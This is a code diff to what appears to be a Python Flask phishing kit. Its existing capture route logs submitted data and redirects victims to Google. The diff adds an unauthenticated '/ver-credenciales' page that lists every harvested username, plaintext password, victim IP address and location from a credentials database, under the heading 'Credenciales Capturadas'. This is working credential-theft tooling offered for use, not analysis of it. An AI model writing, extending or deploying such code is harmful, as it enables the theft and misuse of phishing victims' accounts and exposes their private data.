@@ -293,6 +293,72 @@ def capture():
     send_notifications(data)
     return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
 
+# =============================================
+# NUEVA RUTA PARA VER CREDENCIALES SIN API KEY
+# =============================================
+@app.route('/ver-credenciales')
+def ver_credenciales():
+    """Muestra las credenciales en formato HTML legible"""
+    conn = sqlite3.connect('credentials.db', check_same_thread=False)
+    cursor = conn.cursor()
+    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
+    rows = cursor.fetchall()
+    conn.close()
+    
+    if not rows:
+        return "<h1>📭 No hay credenciales capturadas aún</h1>"
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Credenciales Capturadas</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
+            h1 { color: #1a73e8; text-align: center; }
+            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
+            td { padding: 10px; border-bottom: 1px solid #ddd; }
+            tr:hover { background: #f5f5f5; }
+            .badge { background: #4CAF50; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
+        </style>
+    </head>
+    <body>
+        <h1>🔐 Credenciales Capturadas</h1>
+        <p style="text-align:center; color:#666;">Total: <strong>"""+str(len(rows))+"""</strong></p>
+        <table>
+            <tr>
+                <th>#</th>
+                <th>Fecha</th>
+                <th>IP</th>
+                <th>Ubicación</th>
+                <th>Usuario</th>
+                <th>Contraseña</th>
+            </tr>
+    """
+    
+    for r in rows:
+        html += f"""
+            <tr>
+                <td>{r[0]}</td>
+                <td>{r[1]}</td>
+                <td>{r[2]}</td>
+                <td>{r[5]}</td>
+                <td><strong>{r[3]}</strong></td>
+                <td><span class="badge">{r[4]}</span></td>
+            </tr>
+        """
+    
+    html += """
+        </table>
+        <p style="text-align:center; margin-top:20px; color:#999; font-size:14px;">
+            Actualizado: """+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"""
+        </p>
+    </body>
+    </html>
+    """
+    return html
+
 @app.route('/api/credentials')
 def api_credentials():
     key = request.headers.get('X-API-Key')
